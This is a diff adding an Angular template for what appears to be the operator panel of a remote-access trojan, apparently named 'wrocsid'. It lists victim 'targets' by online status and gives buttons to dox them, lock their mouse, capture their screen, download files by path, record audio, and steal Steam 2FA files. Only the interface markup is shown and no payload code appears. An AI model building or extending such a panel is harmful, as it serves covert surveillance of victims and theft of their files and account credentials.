@@ -1,0 +1,79 @@
+<div class="center">
+  <mat-accordion *ngIf="targets">
+    <mat-expansion-panel (click)="changePanelState()" *ngFor="let target of targets" [disabled]="!target.online">
+      <mat-expansion-panel-header>
+        <mat-panel-title>
+          <mat-icon class="online" *ngIf="(target && target.online)">wifi</mat-icon>
+          <mat-icon class="offline" *ngIf="(!(target && target.online))">wifi_off</mat-icon>
+          {{ target.identifier }}
+        </mat-panel-title>
+        <mat-panel-description>
+          {{ target.metadata }}
+        </mat-panel-description>
+      </mat-expansion-panel-header>
+      <div class="commandBtns">
+        <div>
+          <button mat-button [disabled]="!target.online" color="accent"
+            (click)="wrocsidHandler('dox', target.identifier)">Dox</button>
+        </div>
+        <div>
+          <button mat-button [disabled]="!target.online || !mouseForm.valid" color="accent"
+            (click)="wrocsidHandler('mouse', target.identifier, concatTime(mouseForm))">Mouse Lock</button>
+          <form [formGroup]="mouseForm">
+            <mat-form-field appearance="fill" class="timeInput">
+              <mat-label>Time amount</mat-label>
+              <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+              <mat-error *ngIf="mouseForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+            </mat-form-field>
+            <mat-form-field appearance="fill" class="timeInput">
+              <mat-label>Time units</mat-label>
+              <select matNativeControl required [attr.disabled]="!target.online" #timeUnits formControlName="timeUnits">
+                <option value="s">Seconds</option>
+                <option value="m">Minutes</option>
+                <option value="h">Hours</option>
+              </select>
+            </mat-form-field>
+          </form>
+        </div>
+        <div>
+          <button mat-button [disabled]="!target.online" color="accent"
+            (click)="wrocsidHandler('screen', target.identifier)">Screen</button>
+        </div>
+        <div>
+          <form [formGroup]="downloadForm">
+          <button mat-button [disabled]="!target.online || !downloadForm.valid" color="accent"
+            (click)="wrocsidHandler('download', target.identifier, getPath(downloadForm))">Download</button>
+            <mat-form-field appearance="fill" class="timeInput">
+              <mat-label>Path</mat-label>
+              <input matInput required formControlName="path" #path>
+              <mat-error *ngIf="downloadForm.get('path')?.invalid">Not a valid path...</mat-error>
+            </mat-form-field>
+          </form>
+        </div>
+        <div>
+          <button mat-button [disabled]="!target.online || !recordForm.valid" color="accent"
+            (click)="wrocsidHandler('record', target.identifier, concatTime(recordForm))">Record</button>
+            <form [formGroup]="recordForm">
+              <mat-form-field appearance="fill" class="timeInput">
+                <mat-label>Time amount</mat-label>
+                <input matInput required type="number" min="1" #timeAmount formControlName="timeAmount">
+                <mat-error *ngIf="recordForm.get('timeAmount')?.invalid">Not a valid number...</mat-error>
+              </mat-form-field>
+              <mat-form-field appearance="fill" class="timeInput">
+                <mat-label>Time units</mat-label>
+                <select matNativeControl required [attr.disabled]="!target.online" #timeUnits formControlName="timeUnits">
+                  <option value="s">Seconds</option>
+                  <option value="m">Minutes</option>
+                  <option value="h">Hours</option>
+                </select>
+              </mat-form-field>
+            </form>
+        </div>
+        <div>
+          <button mat-button [disabled]="!target.online" color="accent"
+            (click)="wrocsidHandler('getSteam2fa', target.identifier)">Get Steam 2FA Files</button>
+        </div>
+      </div>
+    </mat-expansion-panel>
+  </mat-accordion>
+  <div>
